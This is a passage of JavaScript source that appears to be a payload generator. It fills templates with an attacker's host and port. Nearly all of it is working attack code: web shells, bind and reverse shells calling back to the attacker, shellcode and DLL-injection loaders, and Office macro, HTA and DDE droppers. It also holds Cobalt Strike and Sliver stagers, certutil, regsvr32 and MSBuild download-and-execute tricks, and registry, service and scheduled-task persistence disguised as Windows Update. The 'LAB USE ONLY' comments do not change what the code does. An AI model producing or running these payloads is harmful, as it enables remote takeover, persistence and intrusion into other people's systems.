    nc -lp ${lport} -e /bin/bash 2>/dev/null || \\
    nc -lp ${lport} -c /bin/bash 2>/dev/null || \\
    { rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lp ${lport} > /tmp/f; }
done`;
          break;
        default:
          rawCode = base + `// Bind shell not implemented for ${format}`;
      }
      break;
    }
    case 'webshell': {
      switch (format) {
        case 'php':
          rawCode = base + `<?php
// PHP WebShell — ⚠️ LAB USE ONLY
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>


You can also use: curl -X GET "http://target/webshell.php?cmd=id"`;
          break;
        case 'javascript':
          rawCode = base + `// Node.js WebShell
const http = require('http');
const { exec } = require('child_process');

http.createServer((req, res) => {
    const url = new URL(req.url, 'http://localhost');
    const cmd = url.searchParams.get('cmd');
    if (cmd) {
        exec(cmd, (err, stdout) => {
            res.end(stdout || err?.message || '');
        });
    } else {
        res.end('WebShell ready');
    }
}).listen(${lport});

console.log(\`WebShell listening on port ${lport}\`);`;
          break;
        case 'python':
          rawCode = base + `#!/usr/bin/env python3
import http.server
import subprocess
import urllib.parse

class WebShellHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        query = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        cmd = query.get('cmd', [''])[0]
        if cmd:
            try:
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(result)
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(str(e).encode())
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'WebShell ready')

if __name__ == "__main__":
    http.server.HTTPServer(('0.0.0.0', ${lport}), WebShellHandler).serve_forever()`;
          break;
        case 'jsp':
          rawCode = base + `<%@ page import="java.io.*" %>
<%!
    String execCmd(String cmd) throws Exception {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        StringBuilder out = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) out.append(line).append("\\n");
        return out.toString();
    }
%>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null && !cmd.isEmpty()) {
        out.println("<pre>" + execCmd(cmd) + "</pre>");
    } else {
        out.println("JSP WebShell ready");
    }
%>`;
          break;
        case 'aspx':
          rawCode = base + `<%@ Page Language="C#" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e) {
        string cmd = Request["cmd"];
        if (!string.IsNullOrEmpty(cmd)) {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();
            Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
        } else {
            Response.Write("ASPX WebShell ready");
        }
    }
</script>`;
          break;
        default:
          rawCode = base + `// WebShell not implemented for ${format}`;
      }
      break;
    }
    case 'dll_inject': {
      if (format === 'csharp') {
        rawCode = base + `using System;
using System.Runtime.InteropServices;

class DllInjector {
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    static void Main() {
        int pid = 0; // Set target PID
        string dllPath = @"C:\\path\\to\\payload.dll";
        IntPtr hProcess = OpenProcess(0x1F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllPath.Length + 1, 0x3000, 0x40);
        byte[] bytes = System.Text.Encoding.ASCII.GetBytes(dllPath);
        WriteProcessMemory(hProcess, addr, bytes, (uint)bytes.Length, out _);
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
}`;
      } else if (format === 'raw_c') {
        rawCode = base + `#include <windows.h>
#include <stdio.h>

int main() {
    unsigned char shellcode[] = {
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00
        // ... actual shellcode bytes
    };
    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}`;
      } else {
        rawCode = base + `// DLL injection not implemented for ${format}`;
      }
      break;
    }
    case 'shellcode': {
      switch (format) {
        case 'raw_c':
          rawCode = base + `// Shellcode in C — replace with actual shellcode bytes
unsigned char shellcode[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00,
    0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
    0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
    0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
    0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
    0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
    0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
    0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
    0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
    0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
    0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
    0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
    0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
    0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
    0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
    0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
    0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0,
    0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
    0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
    0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5
};
int main() {
    ((void(*)())shellcode)();
    return 0;
}`;
          break;
        case 'python':
          rawCode = base + `import ctypes

# Replace with actual shellcode bytes from msfvenom
shellcode = bytes([
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00
])

# Allocate executable memory
libc = ctypes.CDLL('libc.so.6')
exec_mem = libc.valloc(len(shellcode))
ctypes.memmove(exec_mem, shellcode, len(shellcode))
libc.mprotect(exec_mem, len(shellcode), 0x7)

# Execute
func = ctypes.cast(exec_mem, ctypes.CFUNCTYPE(None))
func()`;
          break;
        case 'go':
          rawCode = base + `package main

import (
    "syscall"
    "unsafe"
)

func main() {
    shellcode := []byte{
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00,
    }
    exec, _ := syscall.Mmap(-1, 0, len(shellcode),
        syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
        syscall.MAP_ANONYMOUS|syscall.MAP_PRIVATE)
    copy(exec, shellcode)
    syscall.Syscall(uintptr(exec), 0, 0, 0, 0)
}`;
          break;
        case 'rust':
          rawCode = base + `use std::mem;
use std::ptr;
use libc::{mmap, munmap, MAP_ANONYMOUS, MAP_PRIVATE, PROT_EXEC, PROT_READ, PROT_WRITE};

fn main() {
    let shellcode: [u8; 10] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00,
    ];
    unsafe {
        let exec_mem = mmap(
            ptr::null_mut(),
            shellcode.len(),
            PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_ANONYMOUS | MAP_PRIVATE,
            -1,
            0,
        );
        ptr::copy(shellcode.as_ptr(), exec_mem as *mut u8, shellcode.len());
        let func: fn() = mem::transmute(exec_mem);
        func();
        munmap(exec_mem, shellcode.len());
    }
}`;
          break;
        default:
          rawCode = base + `// Shellcode not implemented for ${format}`;
      }
      break;
    }
    case 'macro': {
      rawCode = base + `Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command $client = New-Object System.Net.Sockets.TCPClient(""${lhost}"",${lport}); $stream = $client.GetStream(); [byte[]]$b = 0..65535 | %{0}; while(($i = $stream.Read($b, 0, $b.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }"
    CreateObject("WScript.Shell").Run cmd, 0, False
End Sub

' ⚠️ LAB USE ONLY — unauthorized use is illegal`;
      break;
    }
    case 'hta': {
      rawCode = base + `<html>
<head>
    <HTA:APPLICATION ID="oApp" APPLICATIONNAME="HTAPayload" />
    <title>HTA Payload</title>
</head>
<script language="JScript">
    function exec() {
        var cmd = "powershell -WindowStyle Hidden -Command $client=New-Object System.Net.Sockets.TCPClient('${lhost}',${lport}); $stream=$client.GetStream(); [byte[]]$b=0..65535|%{0}; while(($i=$stream.Read($b,0,$b.Length))-ne 0){ $data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $sendback=(iex $data 2>&1 | Out-String); $sendback2=$sendback+'PS '+(pwd).Path+'> '; $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }";
        new ActiveXObject("WScript.Shell").Run(cmd, 0, false);
    }
    window.onload = exec;
</script>
<body>
    <h1>Loading...</h1>
</body>
</html>
<!-- ⚠️ LAB USE ONLY — unauthorized use is illegal -->`;
      break;
    }
    case 'reverse_https':
      rawCode = base + `# Reverse HTTPS shell — Python with SSL
import socket, ssl, subprocess, os, sys

def reverse_https():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("${lhost}", ${lport}))
        ctx = ssl.create_default_context()
        ssl_sock = ctx.wrap_socket(sock, server_hostname="${lhost}")
        os.dup2(ssl_sock.fileno(), 0)
        os.dup2(ssl_sock.fileno(), 1)
        os.dup2(ssl_sock.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        sys.exit(1)

if __name__ == "__main__":
    reverse_https()`;
      break;
    case 'reverse_http':
      rawCode = base + `# Reverse HTTP shell — Python with requests
import requests, subprocess, time, sys

def reverse_http():
    while True:
        try:
            r = requests.get(f'http://${lhost}:${lport}/cmd', timeout=5)
            if r.status_code == 200 and r.text:
                out = subprocess.check_output(r.text, shell=True, stderr=subprocess.STDOUT)
                requests.post(f'http://${lhost}:${lport}/result', data=out)
        except:
            pass
        time.sleep(2)

if __name__ == "__main__":
    reverse_http()`;
      break;
    case 'bind_https':
      rawCode = base + `# Bind HTTPS shell — Python SSL server
import socket, ssl, subprocess, os, sys

def bind_https():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('0.0.0.0', ${lport}))
        sock.listen(1)
        conn, addr = sock.accept()
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        # Load cert.pem and key.pem
        ctx.load_cert_chain('cert.pem', 'key.pem')
        ssl_conn = ctx.wrap_socket(conn, server_side=True)
        os.dup2(ssl_conn.fileno(), 0)
        os.dup2(ssl_conn.fileno(), 1)
        os.dup2(ssl_conn.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        sys.exit(1)

if __name__ == "__main__":
    bind_https()`;
      break;
    case 'java_webshell':
      rawCode = base + `<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null && !cmd.isEmpty()) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            out.println(line);
        }
    }
%>`;
      break;
    case 'aspx_webshell':
      rawCode = base + `<%@ Page Language="C#" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e) {
        string cmd = Request["cmd"];
        if (!string.IsNullOrEmpty(cmd)) {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();
            Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
        }
    }
</script>`;
      break;
    case 'encrypted_shell':
      rawCode = base + `# AES encrypted reverse shell — Python
from Crypto.Cipher import AES
import socket, subprocess, os, sys, base64

key = b'0123456789abcdef'
iv = b'1234567890abcdef'

def encrypt(data):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pad_len = 16 - (len(data) % 16)
    padded = data + b' ' * pad_len
    return cipher.encrypt(padded)

def decrypt(data):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.decrypt(data).rstrip(b' ')

def reverse_encrypted():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("${lhost}", ${lport}))
        while True:
            cmd = s.recv(1024)
            if not cmd:
                break
            decrypted = decrypt(cmd).decode()
            if decrypted == 'exit':
                break
            out = subprocess.check_output(decrypted, shell=True, stderr=subprocess.STDOUT)
            s.send(encrypt(out))
    except Exception as e:
        sys.exit(1)

if __name__ == "__main__":
    reverse_encrypted()`;
      break;
    case 'powershell_encoded':
      rawCode = base + `# Encoded PowerShell command — base64
# Generate the command:
$code = '$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($code)
$encoded = [Convert]::ToBase64String($bytes)
Write-Host $encoded

# Run with: powershell -EncodedCommand <encoded_string>`;
      break;
    case 'csharp_loader':
      rawCode = base + `using System;
using System.Runtime.InteropServices;

class CSharpLoader {
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    static void Main() {
        // Replace with actual shellcode from msfvenom
        byte[] shellcode = new byte[] {
            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00
        };
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}

// Compile with: csc /platform:x64 /target:exe loader.cs`;
      break;
    case 'dns_shell':
      rawCode = base + `# DNS shell — Python using dnslib
# This is a minimal example. Full implementation requires a DNS server.
import socket, subprocess, sys, dns.resolver

def dns_query(host, cmd):
    # Encode command in subdomain
    encoded = '.'.join(cmd[:10]) + '.domain.com'
    try:
        dns.resolver.query(encoded, 'A')
    except:
        pass

def dns_shell():
    # Poll for commands via DNS
    while True:
        # Read command from DNS TXT record
        try:
            answer = dns.resolver.resolve('cmd.domain.com', 'TXT')
            cmd = answer[0].strings[0].decode()
            if cmd == 'exit':
                break
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            # Send output via DNS (truncated)
            dns_query('domain.com', out.decode()[:100])
        except:
            pass

if __name__ == "__main__":
    dns_shell()`;
      break;
    case 'icmp_shell':
      rawCode = base + `# ICMP shell — Python using scapy
# Requires: pip install scapy
from scapy.all import *
import subprocess, sys

def process_icmp(pkt):
    if ICMP in pkt and pkt[ICMP].type == 8:  # Echo request
        cmd = pkt[Raw].load.decode()
        if cmd == 'exit':
            sys.exit(0)
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        send(IP(dst=pkt[IP].src)/ICMP(type=0)/out)

def icmp_shell():
    sniff(filter="icmp", prn=process_icmp)

if __name__ == "__main__":
    icmp_shell()`;
      break;
    case 'smb_shell':
      rawCode = base + `# SMB shell — Python using impacket
# Requires: pip install impacket
# This is a psexec-style implementation
# Use smbexec.py from impacket:
# smbexec.py <domain>/<user>:<password>@<target>`;
      break;
    case 'ssh_shell':
      rawCode = base + `#!/bin/bash
# SSH reverse tunnel — establish a reverse shell via SSH
# Run this on the target:
ssh -R ${lport}:localhost:22 user@${lhost}

# Then from your machine:
ssh -p ${lport} localhost

# ⚠️ Requires SSH server on the target and valid credentials`;
      break;
    case 'powershell_plain':
      rawCode = base + `$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()`;
      break;
    case 'bash_reverse':
      rawCode = base + `#!/bin/bash
bash -i >& /dev/tcp/${lhost}/${lport} 0>&1

# Fallback if /dev/tcp is unavailable:
# python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
      break;
    case 'wmi_shell': {
      rawCode = base + `# WMI Shell — PowerShell
$cred = Get-Credential
$Computer = "${lhost}"
$Command = "cmd.exe /c whoami"
$WMIClient = New-Object System.Management.ManagementClass("Win32_Process")
$WMIClient.Scope = New-Object System.Management.ManagementScope("\\\\$Computer\\root\\cimv2", $cred)
$WMIClient.Scope.Connect()
$WMIClient.Create($Command)

# For interactive use, use wmiexec.py from impacket`;
      break;
    }
    case 'winrm_shell': {
      rawCode = base + `# WinRM Shell — PowerShell
$cred = Get-Credential
$Computer = "${lhost}"
Invoke-Command -ComputerName $Computer -ScriptBlock { whoami } -Credential $cred

# Interactive session:
Enter-PSSession -ComputerName $Computer -Credential $cred`;
      break;
    }
    case 'cobalt_strike_beacon': {
      rawCode = base + `# Cobalt Strike Beacon — PowerShell Stager
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
IEX (New-Object Net.WebClient).DownloadString("http://${lhost}:${lport}/payload.ps1")

# ⚠️ This is a placeholder. Generate actual Beacon using Cobalt Strike's Arsenal.
# The real Beacon is a reflective DLL with C2 profiles.`;
      break;
    }
    case 'sliver_beacon': {
      rawCode = base + `# Sliver C2 — PowerShell Stager
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
IEX (New-Object Net.WebClient).DownloadString("http://${lhost}:${lport}/sliver.ps1")

# ⚠️ Generate actual implant using sliver-server:
# sliver-server
# generate --http ${lhost}:${lport}`;
      break;
    }
    case 'macos_reverse': {
      rawCode = base + `#!/usr/bin/env python3
import socket, subprocess, os, sys

def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("${lhost}", ${lport}))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/zsh", "-i"])
    except Exception as e:
        sys.exit(1)

if __name__ == "__main__":
    reverse_shell()`;
      break;
    }
    case 'msbuild_applocker_bypass': {
      rawCode = base + `<!-- MSBuild AppLocker Bypass — .csproj file -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Execute">
    <Code Type="C#" Language="C#" Source="
      using System;
      using System.Net;
      using System.Diagnostics;
      class Program {
        static void Main() {
          WebClient wc = new WebClient();
          byte[] payload = wc.DownloadData("http://${lhost}:${lport}/payload.exe");
          Process.Start("C:\\\\Windows\\\\Temp\\\\payload.exe");
        }
      }
    "/>
  </Target>
</Project>

# Execute with:
# C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.csproj`;
      break;
    }
    case 'regsvr32_squiblydoo': {
      rawCode = base + `<!-- Squiblydoo SCT File -->
<?XML version="1.0"?>
<scriptlet>
<registration progid="Test" classid="{A1112221-0000-0000-0000-000000000000}">
  <script language="JScript">
    <![CDATA[
      var cmd = new ActiveXObject("WScript.Shell").Run(
        "powershell -WindowStyle Hidden -Command $client=New-Object System.Net.Sockets.TCPClient('${lhost}',${lport}); $stream=$client.GetStream(); [byte[]]$b=0..65535|%{0}; while(($i=$stream.Read($b,0,$b.Length))-ne 0){ $data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $sendback=(iex $data 2>&1 | Out-String); $sendback2=$sendback+'PS '+(pwd).Path+'> '; $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }",
        0, false
      );
    ]]>
  </script>
</registration>
</scriptlet>

# Host on a web server and execute with:
# regsvr32 /s /u /i:http://${lhost}:${lport}/payload.sct scrobj.dll`;
      break;
    }
    case 'certutil_downloader': {
      rawCode = base + `# Certutil Downloader — Batch
certutil -urlcache -f http://${lhost}:${lport}/payload.b64 payload.b64
certutil -decode payload.b64 payload.exe
payload.exe

# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
      break;
    }
    case 'excel4_macro': {
      const psCommand = `powershell -WindowStyle Hidden -Command $client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport}); $stream = $client.GetStream(); [byte[]]$b = 0..65535 | %{0}; while(($i = $stream.Read($b, 0, $b.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }`;
      const excelSafe = psCommand.replace(/\$/g, '$$$$');
      rawCode = base + `# Excel 4.0 Macro (XLM)
# Paste this into an Excel 4.0 macro sheet
=EXEC("${excelSafe}")
=HALT()

# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
      break;
    }
    case 'dde_injection': {
      rawCode = base + `# DDE Injection Field
# Insert as a Word/Excel field (Ctrl+F9 to create field)
{ DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k mshta.exe http://${lhost}:${lport}/payload.hta" }

# Alternative:
{ DDEAUTO "c:\\\\windows\\\\system32\\\\mshta.exe" "http://${lhost}:${lport}/payload.hta" }

# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
      break;
    }
    case 'donut_shellcode': {
      rawCode = base + `// Donut Shellcode — C# Loader
using System;
using System.Runtime.InteropServices;

class DonutLoader {
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    static void Main() {
        // Replace with Donut-generated shellcode
        byte[] shellcode = new byte[] {
            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00
        };
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}

# Generate shellcode with:
# donut.exe -a 2 -f 1 -i payload.exe -o shellcode.bin`;
      break;
    }
    case 'com_hijack': {
      rawCode = base + `# COM Hijacking — Registry Modification
# Find a COM object to hijack (e.g., CLSID from a known application)
# Modify the InprocServer32 key to point to your malicious DLL

# PowerShell example:
$regPath = "HKCR:\\CLSID\\{00000000-0000-0000-0000-000000000000}\\InprocServer32"
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\\Windows\\Temp\\malicious.dll"

# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
      break;
    }
    case 'task_scheduler_persistence': {
      rawCode = base + `# Task Scheduler Persistence — PowerShell
$action = New-ScheduledTaskAction -Execute "C:\\Windows\\Temp\\payload.exe"
$trigger = New-ScheduledTaskTrigger -AtLogOn -User "SYSTEM"
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Password ""

# Or using schtasks:
schtasks /create /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\payload.exe" /sc onlogon /ru SYSTEM

# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
      break;
    }
    case 'registry_persistence': {
      rawCode = base + `# Registry Run Persistence — PowerShell
# User-level persistence:
$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
Set-ItemProperty -Path $regPath -Name "LegitApp" -Value "C:\\Users\\Public\\payload.exe"

# SYSTEM-level persistence:
$regPath = "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
Set-ItemProperty -Path $regPath -Name "SystemApp" -Value "C:\\Windows\\Temp\\payload.exe"

# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
      break;
    }
    case 'service_persistence': {
      rawCode = base + `# Service Persistence — PowerShell
$serviceName = "WindowsUpdateService"
$binaryPath = "C:\\Windows\\Temp\\payload.exe"
New-Service -Name $serviceName -BinaryPathName $binaryPath -DisplayName "Windows Update Service" -StartupType Automatic

# Or using sc:
sc create WindowsUpdateService binPath= "C:\\Windows\\Temp\\payload.exe" start= auto

# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
      break;
    }
    case 'aws_ec2_reverse': {
      rawCode = base + `#!/usr/bin/env python3
# AWS EC2 Reverse Shell — Python
import socket, subprocess, os, sys
import requests

def get_instance_metadata():
    try:
        r = requests.get('http://169.254.169.254/latest/meta-data/instance-id', timeout=2)
        return r.text
    except:
        return 'unknown'

def reverse_shell():
    try:
        instance_id = get_instance_metadata()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("${lhost}", ${lport}))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        sys.exit(1)

if __name__ == "__main__":
    reverse_shell()

# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
      break;
    }
    case 'gcp_compute_reverse': {
